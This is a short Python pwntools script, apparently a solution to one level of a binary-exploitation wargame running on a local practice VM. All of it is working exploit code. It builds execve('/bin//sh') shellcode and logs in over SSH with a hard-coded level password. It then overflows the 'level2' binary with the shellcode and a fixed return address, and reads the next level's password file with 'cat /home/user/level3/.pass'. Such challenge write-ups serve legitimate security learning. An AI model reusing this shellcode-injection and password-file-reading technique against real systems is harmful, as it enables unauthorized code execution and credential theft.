from pwn import *

# assembly code => execv('/bin//sh')
shellcode = asm('''
_start:
    xor eax, eax
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    push edx
    mov ebx, 0x68732f2f
    push ebx
    mov ebx, 0x6e69622f
    push ebx
    mov ebx, esp
    int 0x80
''')

# Change host according to your configuration
s = ssh(
    user="level2",
    host="192.168.56.101",
    password="53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77",
    port=4242
)


p = s.process("/home/user/level2/level2")
p.sendline(bytes(shellcode) + p32(0x0804a008).rjust(59))
p.sendline(b'cat /home/user/level3/.pass')

#p.interactive()
p.stream()

p.close()
s.close()
